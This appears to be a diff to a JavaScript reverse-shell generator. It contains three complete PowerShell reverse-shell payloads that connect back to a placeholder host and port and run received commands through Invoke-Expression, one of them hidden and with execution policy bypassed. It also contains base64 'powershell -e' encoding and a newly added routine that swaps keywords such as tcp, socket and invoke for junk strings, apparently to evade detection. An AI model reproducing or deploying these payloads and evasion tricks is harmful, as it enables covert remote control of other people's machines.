@@ -1,6 +1,6 @@
 const psOne = '$LHOST = "<host>"; $LPORT = <port>; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()';
 
-const psTwo = 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient("<host>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
+const psTwo = 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient("<host>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
 
 const psThree = 'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient("<host>", <port>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + "SHELL> ");$StreamWriter.Flush()}WriteToStream "";while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"';
 
@@ -24,7 +24,32 @@ const listenerSeven = 'sudo msfconsole -q -x "use multi/handler; set payload win
 
 const listenersRaw = [listenerOne, listenerTwo, listenerThree, listenerFour, listenerFive, listenerSix, listenerSeven];
 
+// mangle
+const replaceStrArr = ['dfi1', 'wiggleworm', 'nOt4t0', 'd00d1eb0p', 'unpotat', 'soiledpeanuts', 'tinylittledragons', 'thetiniestofhorses', 'capitalismisascam','bramblebush', 'ins4ecureSilly', '456yt', '@@@^', 'muscleperverts', 'inniebellybutton', 'ponishouldponiponi', 'ayylemone', 'testicles', 'lololol', 'teppidwater', 'orderhotwaterataniceresteraunt', 'deee', 'onoamouse'];
 
+const findStrArr = [/new/gi, /net/gi, /client/gi, /tcp/gi, /object/gi, /new/gi, /mkfifo/gi, /socket/gi, /tmp/gi, /security/gi, /ssl/gi, /stream/gi, /\$/gi, /buff/gi, /out/gi, /system/gi, /proto/gi, /expre/gi, /invoke/gi, /flush/gi, /auth/gi, /\./gi, /;/gi];
+
+const staticStrArr = ['new', 'net', 'client', 'tcp', 'object', 'new', 'mkfifo', 'socket', 'tmp', 'security', 'ssl', 'stream', '$', 'buff', 'out', 'system', 'proto', 'expre', 'invoke', 'flush', 'auth', '.', ';'];
+
+function mangleRevShell(revShellStr) {
+    let mangiemut = revShellStr;
+
+    for(let i=0; i<findStrArr.length; i++) {
+        mangiemut = mangiemut.replaceAll(findStrArr[i], replaceStrArr[i]);
+    }
+
+    return mangiemut;
+}
+
+function demangleRevShell(mangledRevShellStr) {
+    let cutedoggy = mangledRevShellStr;
+    for(let i=0; i<findStrArr.length; i++) {
+        cutedoggy = cutedoggy.replaceAll(replaceStrArr[i], staticStrArr[i]);
+    }
+
+    return cutedoggy;
+}
+/*
 function revealConfig() {
     document.getElementById("advancedConfig").style.display = "block";
 }
@@ -32,7 +57,7 @@ function revealConfig() {
 function showListener() {
     document.getElementById("listenerDiv").style.display = "block";
 }
-
+*/
 
 function encodeUTF16LE(str) { // props Keveun https://stackoverflow.com/questions/24379446/utf-8-to-utf-16le-javascript
     var out, i, len, c;
@@ -120,7 +145,7 @@ function encodePS(rawShellString, listenerShow=true) {
     const minLen = document.getElementById("minLen").value;
     const maxLen = document.getElementById("maxLen").value;
 
-    let matchies = rawShellString.match(/\$(?!null|zero|false|true|script|buffer)[a-z0-9-_]{2,30}/gi);
+    let matchies = rawShellString.match(/\$(?!null|zero|false|true|script|buffer)[a-z0-9-_]{1,30}/gi);
 
     const varsLen = matchies.length;
 
@@ -138,9 +163,8 @@ function encodePS(rawShellString, listenerShow=true) {
     // for `powershell -e $base64EncodedData` to work, the commands need to be first encoded into Unicode/UTF-16 LE (Windows default) than base64 encoded
     const psEncodedlUTF16LE = encodeUTF16LE(moddedCmdString);
     const base64EncodedPSExecutable = "powershell -e " + btoa(psEncodedlUTF16LE);
+    const mangledCmd = mangleRevShell(moddedCmdString);
     const listener = configShell(listenersRaw[rstype], host, port);
-
-    console.log(listenersRaw[rstype]);
 
     document.getElementById("hiddenOutput").innerHTML = base64EncodedPSExecutable;
     document.getElementById("hiddenUnencoded").innerHTML = moddedCmdString;
@@ -184,7 +208,9 @@ function swapMode(mode) {
     document.getElementById('encodedDiv').style.display = "none"; // output div
 }
 
+/*
 function obsenc(cmd) {
     const matchies = cmd.match(/\$[a-zA-z0-9-_]{2,30}[\s;\.]/gi);
     console.log(matchies);
 }
+*/
